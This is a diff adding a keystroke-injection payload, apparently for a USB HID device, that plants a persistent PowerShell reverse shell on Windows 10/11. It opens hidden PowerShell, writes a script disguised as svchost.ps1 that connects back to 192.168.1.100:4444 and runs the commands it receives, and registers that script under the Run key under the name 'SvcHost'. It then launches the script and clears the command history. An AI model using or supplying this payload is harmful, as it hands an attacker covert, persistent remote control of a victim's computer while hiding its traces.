@@ -1,0 +1,38 @@
+# ============================================
+# WINDOWS REVERSE SHELL - Persistent Access
+# ============================================
+# Purpose: Establish PowerShell reverse shell
+# Target: Windows 10/11
+# Time: 15 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+# Create reverse shell script
+STRING $s = "$env:APPDATA\Microsoft\Windows\svchost.ps1"
+ENTER
+STRING echo "while(`$true) { try { `$c = New-Object System.Net.Sockets.TcpClient('192.168.1.100',4444); `$s = `$c.GetStream(); [byte[]]`$b = 0..65535|%{0}; while((`$i = `$s.Read(`$b,0,`$b.Length)) -ne 0) { `$d = (New-Object Text.UTF8Encoding).GetString(`$b,0,`$i); `$r = (iex `$d 2>&1 | Out-String); `$r += 'PS ' + (pwd).Path + '> '; `$e = [text.encoding]::UTF8.GetBytes(`$r); `$s.Write(`$e,0,`$e.Length) } catch {} `$c.Close(); Start-Sleep 300 }" > `$s
+ENTER
+DELAY 300
+
+# Add to startup
+STRING $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+ENTER
+STRING Set-ItemProperty -Path $reg -Name "SvcHost" -Value "powershell -W H -EP B -File $s"
+ENTER
+DELAY 200
+
+# Start immediately
+STRING Start-Process powershell -ArgumentList "-W H -EP B -File $s"
+ENTER
+DELAY 200
+
+STRING Clear-History; exit
+ENTER
